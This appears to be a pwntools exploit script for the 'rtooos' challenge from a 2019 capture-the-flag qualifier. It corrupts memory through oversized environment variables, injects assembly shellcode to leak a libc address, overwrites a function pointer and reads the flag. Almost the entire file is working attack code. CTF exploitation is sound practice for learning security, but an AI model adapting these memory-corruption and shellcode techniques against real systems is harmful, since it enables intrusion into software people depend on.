from pwn import *

r = remote("rtooos.quals2019.oooverflow.io", 5000)
def f(x):
	assert(len(x) < 511)
	r.sendlineafter("[RTOoOS> ", x)

"""
f("export a="+"A"*400)
f("export b="+"B"*400+"$a")
f("export c=CCCC")
"""

f("export a="+"A"*15+p16(0xffff))#504+437+0x18*3))
f("export b="+"B"*490+"$a")
f("export c="+"C"*490)
f("export d="+"D"*490)
f("export b="+"B"*490+"$a")
f("unset c")
f("export e="+"\x00"*490)
f("export f="+"\x00"*490)
f("export g="+"\x00"*490)
f("export h="+"\x00"*490)
f("export i="+"\x00"*490)
f("export j="+"J"*1+p64(0x0000000000000087)*50)

context.arch = "amd64"
# leak atoi
shellc = asm("""
	xor rax, rax
	sub rax,"""+hex(581632)+"""
	add rax,"""+hex(0x2040)+"""
	mov rdi, 0x64
	out dx, al
	ret
""")
f("export a="+shellc)

# trigger shellcode
f("cat asdf") # < just cat anything
atoi = u64(r.recvline().rstrip().ljust(8, '\x00'))
log.info("atoi : 0x{:x}".format(atoi))

# overwrite strcasestr
shellc = asm("""
	xor rax, rax
	sub rax,"""+hex(581632)+"""
	add rax,"""+hex(0x2170)+"""
	mov rsi, 0x8
	mov rdi, 0x63
	out dx, al
	ret
""")
f("export a="+shellc)
f("cat asdf")
sleep(0.1)
r.send(p64(atoi))

# cat flag
shellc = asm("""
	xor rax, rax
	sub rax,"""+hex(581632)+"""
	add rax,"""+hex(0x1dd4)+"""
	mov rdi, 0x66
	out dx, al
	ret
""")
f("export a="+shellc)
f("cat asdf")
r.interactive()
